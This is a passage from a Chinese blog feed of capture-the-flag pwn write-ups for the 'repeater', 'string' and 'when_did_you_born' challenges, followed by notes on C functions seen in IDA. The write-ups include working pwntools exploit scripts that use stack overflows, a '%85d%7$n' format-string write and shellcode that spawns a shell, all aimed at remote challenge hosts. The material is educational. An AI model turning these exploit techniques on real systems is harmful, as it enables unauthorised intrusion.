段上的，在这里写入一个 <code>shellcode</code></li><li>然后，通过 <code>read()</code> 函数进行栈溢出，一直覆盖到 <code>v5</code> 的位置，并将 <code>v5</code> 的值修改为 <code>3281697</code></li><li>然后程序就会打印出 <code>main()</code> 函数的真实地址，将这个地址记录下来</li><li>在 IDA 中找到 <code>main()</code> 函数的偏移地址，用 <code>main()</code> 函数的 <strong>真实地址 - 偏移地址 &#x3D; 程序的基地址</strong></li><li>在 IDA 中找到 <code>shellcode</code> 存放的偏移地址，用 <code>shellcode</code> 的 <strong>偏移地址 + 程序的基地址 &#x3D; 真实地址</strong></li><li>再次通过 <code>read()</code> 函数进行栈溢出，一直覆盖到函数返回的地方，将返回值修改为 <code>shellcode</code> 的真实地址</li><li>程序跳转到 <code>shellcode</code> 的地址去执行 <code>shellcode</code>，获得 shell</li></ol><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./repeater"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">64526</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me your name :\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># name存储在.bss段上，通过这里的输入向.bss段上写入shellcode</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>  <span class="token comment"># 栈溢出修改v5的值为3281697</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But there is gift for you :\n"</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 保存下程序打印出的main()的真实地址</span>    base_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x0A33</span>  <span class="token comment"># 利用main()的真实地址计算出程序的基地址，0x0A33是main()的偏移地址，可以在ida中查看</span>    shellcode_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x202040</span>  <span class="token comment"># 利用程序的基地址和写入的shellcode在.bss段上的偏移地址，计算出shellcode存放的真实地址</span>    <span class="token comment"># 0x202040是byte_202040在.bss段上的偏移地址，可以在ida中查看 </span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>  <span class="token comment"># 再次通过栈溢出让程序跳转到shellcode的位置去执行</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{7165ca68103868530e16b6038318afc5}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater7.png" alt="攻防世界-repeater7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】string</title>
      <link href="/posts/4312c2bd.html"/>
      <url>/posts/4312c2bd.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>格式化字符串漏洞</mark>，例如通过 <code>printf(&quot;%p__%p__%p__&quot;)</code> 打印出栈中的数据，从而判断输入的数据在栈中的位置，假如已知在栈上第 7 位，然后再通过 <code>printf(&quot;%85d%7$n&quot;)</code> 来将第 7 个参数的值修改为 85</p></li><li><p><mark><code>mmap()</code> 函数可以将输入的数据作为函数来执行</mark>，可以通过写入 <code>Pwntools</code> 生成的默认 <code>shellcode</code> 来执行，等价于执行了 <code>system(&quot;/bin/sh&quot;)</code>，例如：</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1d3c852354df4609bf8e56fe8e9df316">【攻防世界】string</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string1.png" alt="攻防世界-string1.png"></p><p>64位 小端序，开启了金丝雀、栈不可执行</p><p>尝试执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string2.png" alt="攻防世界-string2.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string3.png" alt="攻防世界-string3.png"></p><p>跟进函数 <code>sub_400996()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string4.png" alt="攻防世界-string4.png"></p><p>只是两句输出</p><p>跟进 <code>sub_400D72()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string5.png" alt="攻防世界-string5.png"></p><p>首先让用户输入角色名字，名字的长度被限制在 12 以内</p><p>跟进 <code>sub_400A7D()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string6.png" alt="攻防世界-string6.png"></p><p>首先是讲故事，之后必须输入 <code>&quot;east&quot;</code> 才能跳出 <code>while(1)</code> 循环，而跳出 <code>while</code> 循环就不会执行后面的 <code>if</code> 语句</p><p>跟进 <code>sub_4009DD()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string7.png" alt="攻防世界-string7.png"></p><p>会用 <code>while(1)</code> 循环不停的生成随机数，让用户去输入进行躲避，但是一旦输入错误一次跳出循环之后就 dead，貌似是条死路</p><p>回到 <code>sub_400D72()</code> 继续往下跟进 <code>sub_400BB9()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string8.png" alt="攻防世界-string8.png"></p><p>首先是一段剧情，如果用户输入 “1”，会让用户继续输入地址、愿望，然后会将用户输入的愿望打印出来</p><p>回到 <code>sub_400D72()</code> 继续往下跟进 <code>sub_400CA6()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string9.png" alt="攻防世界-string9.png"></p><p>注意到 if 语句 <code>if ( *a1 == a1[1] )</code>，这里的 <code>a1</code> 就是前面 <code>main()</code> 函数中定义的 <code>v4</code>，也就是说要让 <code>*v4 == v4[1]</code></p><p>但 <code>main()</code> 函数中定义的是 <code>*v4 = 68   v4[1] = 85</code>，因此这里肯定是需要进行数据修改的</p><p>通过 if 语句后，会执行 <code>mmap()</code> 函数，通过 <code>v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL)</code> 将 <code>v1</code> 定义为一个函数<br>然后通过 <code>read()</code> 函数写入 <code>v1()</code> 的内容，最后通过 <code>(v1)(0LL)</code> 将写入的 <code>v1()</code> 函数执行</p><p>于是分析如下：</p><ol><li>程序刚开始前面有几个输入是固定的，程序想要继续执行就必须这么输入</li><li>现在的问题在于如何去修改数据让 <code>*v4 == v4[1]</code></li><li>由于在 <code>main()</code> 函数中，<code>&quot;secret[0] is %x\n&quot;</code> 和 <code>&quot;secret[1] is %x\n&quot;</code> 两句会打印出 <code>*v4</code> 和 <code>v4[1]</code> 的地址</li><li>同时，在 <code>sub_400BB9()</code> 函数中，会要求输入字符串 <code>format</code>，后面又会用 <code>printf(format)</code> 进行打印，因此，可以利用这个输入的字符串 <code>&quot;%s&quot;</code> 来构造格式化字符串漏洞</li><li>将 <code>format</code> 输入为 <code>%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__</code> 可以让 <code>printf()</code> 函数实现 <code>printf(&quot;%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__&quot;)</code> 的操作，可以将栈中的其他数据也给打印出来</li><li>正好前面还要求输入地址，这个地址随便输入一个显眼的数，这样就可以通过 <code>printf()</code> 打印出的结果来找到这个数，从而判断出刚刚输入的地址在栈中的位置了</li><li>于是，当要求输入地址的时候，如果将 <code>*v4</code> 的地址给输进去，这样就知道 <code>*v4</code> 的地址在栈里的位置了，再通过格式化字符串漏洞将这个地址上的数据给修改掉，就可以实现改变 <code>*v4</code> 的值了</li><li>将 <code>*v4</code> 修改为 85 后，就可以通过 <code>sub_400CA6()</code> 函数中的 if 判断了</li><li>之后程序会要求输入 <code>v1</code>，然后将 <code>v1</code> 作为函数来执行，那么可以向 <code>v1</code> 中写入 <code>shellcode</code>，这样程序一执行就会实现 <code>system(&quot;/bin/sh&quot;)</code> 的操作</li></ol><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./string"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">60038</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>    v4_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida中的伪代码，这里“secret[0] is ”后面输出的是v4: v4[0]所在的地址</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What should your character's name be:\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 没有漏洞，随便输入即可</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida中的逻辑，必须这么输入</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida中的逻辑，必须这么输入</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    io.recvuntil("'Give me an address'\n")    io.sendline("1")  # 先随便给出一个地址，等下通过格式化字符串漏洞泄露出栈中的数据，来查看这个地址在栈中的位置    io.recvuntil("And, you wish is:\n")    io.sendline("%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__")  # 将这一串作为printf()的参数泄露栈中的数据    print(io.recv())  # 将泄露出的数据打印出来    """</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 用pwntools生成默认的shellcode，执行该shellcode等价于执行了system("/bin/sh")</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v4_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将v4[0]的地址发过去，通过前面的操作已经知道发过去的V4[0]的位置在栈中的第7位</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%85d%7$n"</span><span class="token punctuation">)</span>  <span class="token comment"># 向第7个参数写入85，即: 将v4[0]的值由68修改为85，这样就实现了v4[0] == v4[1]，可以通过sub_400CA6()中的if语句</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{a6bb09f8f19f8adfa1e160e67269416d}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string10.png" alt="攻防世界-string10.png"></p><p>根据输入的 <code>&quot;1&quot;</code>，用 <code>&quot;%p&quot;</code> 泄露出输入的值在栈中的位置，这里可以看到 <code>&quot;1&quot;</code> 在第 7 位</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string11.png" alt="攻防世界-string11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】when_did_you_born</title>
      <link href="/posts/97b0f12a.html"/>
      <url>/posts/97b0f12a.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉 <mark>查看文件信息</mark>、<mark>查看文件保护</mark>等操作</p></li><li><p>了解 <mark><code>get()</code> 函数的漏洞</mark>，熟悉 <mark>exp 的写法</mark></p></li><li><p><em>熟悉文件与栈的结构：</em></p><ol><li><mark>在真实的 <code>elf</code> 文件中，是小地址在上，大地址在下，栈中的数据往上覆盖</mark></li><li><mark>在 <code>IDA</code> 中出于人性化考虑，栈的数据设计为小地址在下，大地址在上，因此栈中的数据往下覆盖</mark></li></ol></li></ul><hr><p><a href="https://pan.baidu.com/s/1eT_oVeEKPts8Lw2P0nDEnw&password==1axx">【攻防世界】when_did_you_born</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载得到一个可执行的 elf 文件，在 Ubuntu 下查看文件信息：<code>file &lt;文件名&gt;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born1.png" alt="攻防世界-when_did_you_born1.png"></p><p>其中，<strong>ELF 64-bit</strong> 代表该文件是 <em>64 位 elf 文件</em>，<strong>LSB</strong> 代表<em>文件小端序</em>，<strong>executable</strong> 代表<em>可执行的文件</em></p><p>检查文件保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born2.png" alt="攻防世界-when_did_you_born2.png"></p><p>开启了金丝雀（Canary），且栈不可执行</p><p>尝试执行该文件，测试功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born3.png" alt="攻防世界-when_did_you_born3.png"></p><p>程序有两个输入，一个输入生日，一个输入姓名，然后输出其他信息</p><p>尝试恶意输入：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born4.png" alt="攻防世界-when_did_you_born4.png"></p><p>出现溢出</p><p>拖入 IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born5.png" alt="攻防世界-when_did_you_born5.png"></p><p>根据函数的逻辑，用户先输入生日 <code>v5</code>，如果输入 <code>1926</code> 就输出 <code>&quot;You Cannot Born In 1926!&quot;</code>，否则，让用户继续输入姓名 <code>v4</code>，如果 <code>v5 == 1926</code> 就输出 <code>&quot;cat flag&quot;</code></p><p>但是前面又要求 <code>v5 != 1926</code>，因此这里应该是<mark>利用 <code>gets()</code> 函数不限制输入长度的特点，让 <code>v4</code> 输入垃圾字符覆盖掉栈中的数据，从而实现修改 <code>v5</code> 的值</mark></p><p>确定数据在栈中的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born6.png" alt="攻防世界-when_did_you_born6.png"></p><p>需要先从 0x20 的地址覆盖到 0x18 的地址，最后再输入一个 1926 用来覆盖 <code>v5</code>，即可实现</p><p><code>b&#39;a&#39; * (0x20 - 0x18)</code> 表示输入 (0x20 - 0x18) 个字符 <code>&#39;a&#39;</code> 字节，<code>p64(1926)</code> 表示将 1926 打包成 64位 数据</p><p>编写 exp 即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{d941686b2efe84df967c1adf72cb4549}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-when_did_you_born7.png" alt="攻防世界-when_did_you_born7.png"></p><p>输出了：<code>You Shall Have Flag.</code><br>执行到：<code>cat: flag: 没有那个文件或目录</code></p><p>程序已经 PWN 通，只是调用的是本地的主机中的 <code>cat</code> 指令，由于本地没有 flag 文件，所以访问不到</p><p>将脚本中的 content 改为 0 即可 PWN 远程靶机，执行远程主机的 <code>cat</code> 指令</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中的一些C语言函数</title>
      <link href="/posts/73edb5dc.html"/>
      <url>/posts/73edb5dc.html</url>
      
        <content type="html"><![CDATA[<h1 id="readfsqword"><a href="#readfsqword" class="headerlink" title="readfsqword"></a>readfsqword</h1><blockquote><p><strong><code>__readfsqword(0x28u)</code>——canary 保护机制，防止调试</strong></p></blockquote><ul><li><p>程序开始时，定义 <code>v6 = __readfsqword(0x28u)</code></p></li><li><p>程序结束时，通过异或或者其他手段检测 <code>v6</code> 的值是否发生改变</p></li><li><p>若该值发生改变，则程序终止运行</p></li></ul><hr><h1 id="alarm"><a href="#alarm" class="headerlink" title="alarm"></a>alarm</h1><blockquote><p><strong><code>unsigned int alarm(unsigned int seconds)</code>——设置信号传送闹钟，干扰调试</strong></p></blockquote><ul><li><p>用来设置信号 <code>sigalrm</code> 在经过参数 <code>seconds</code> 秒数后发送给目前的进程<br>如果未设置信号 <code>sigalrm</code> 的处理函数，那么 <code>alarm()</code> 默认处理终止进程</p></li><li><p>如果在 <code>seconds</code> 秒内再次调用了 <code>alarm</code> 函数设置了新的闹钟，则后面定时器的设置将覆盖前面的设置，即之前设置的秒数被新的闹钟时间取代<br>当参数 <code>seconds</code> 为 0 时，之前设置的定时器闹钟将被取消，并将剩下的时间返回</p></li></ul><hr><h1 id="read"><a href="#read" class="headerlink" title="read"></a>read</h1><blockquote><p><strong><code>ssize_t read(int fd, void *buf, size_t count)</code>——用于从文件描述符对应的文件中读取数据</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>fd</td><td>文件描述符, 从command line获取数据时，为 0</td></tr><tr><td>buf</td><td>读出数据的缓冲区</td></tr><tr><td>count</td><td>每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）</td></tr></tbody></table><ul><li><p>返回值：</p><ol><li>成功：返回读出的字节数</li><li>失败：返回 -1，并设置 errno。如果在调用 <code>read</code> 之前到达文件末尾，则这次 <code>read</code> 返回 0</li></ol></li><li><p><mark><strong>read 函数可以取代 scanf 从 command line 读取数据</strong></mark></p></li></ul><hr><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><blockquote><p><strong><code>size_t fread(void *ptr, size_t size, size_t count, FILE *stream)</code>——从指定的文件中读取一定数量的数据，并将其存储到指定的内存位置</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">ptr</td><td align="left">指向要存储读取数据的内存块的指针</td></tr><tr><td align="left">size</td><td align="left">要读取的每个数据项的大小（以字节为单位）</td></tr><tr><td align="left">count</td><td align="left">要读取的数据项的数量</td></tr><tr><td align="left">stream</td><td align="left">文件指针，指向要从中读取数据的文件</td></tr></tbody></table><ul><li><p><code>fread()</code> 函数可用于二进制文件和文本文件。对于文本文件，由于可能存在换行符和不可见字符，使用 <code>fread()</code> 函数读取时需要小心，以免导致错误的结果</p></li><li><p>需要确保读取的数据 <code>count</code> 不超过目标数组的大小，以避免溢出。</p></li><li><p>返回值：<br>  <code>fread()</code> 函数返回实际成功读取的数据数目，如果返回值小于 <code>count</code>，可能已经达到文件末尾或发生了错误</p></li></ul><hr><h1 id="write"><a href="#write" class="headerlink" title="write"></a>write</h1><blockquote><p><strong><code>ssize_t write(int fd,const void *buf,size_t count)</code>——用于将数据写入到文件描述符对应的文件</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>fd</td><td>文件描述符（输出到 command line，就是 1）</td></tr><tr><td>buf</td><td>通常是一个字符串，需要写入的字符串</td></tr><tr><td>count</td><td>每次写入的字节数</td></tr></tbody></table><ul><li><p>返回值：</p><ol><li>成功：返回写入的字节数</li><li>失败：返回 -1，并设置 errno</li></ol></li><li><p><mark><strong>write 函数可以代替 printf，往 command line 打印输出</strong></mark></p></li></ul><hr><h1 id="memset"><a href="#memset" 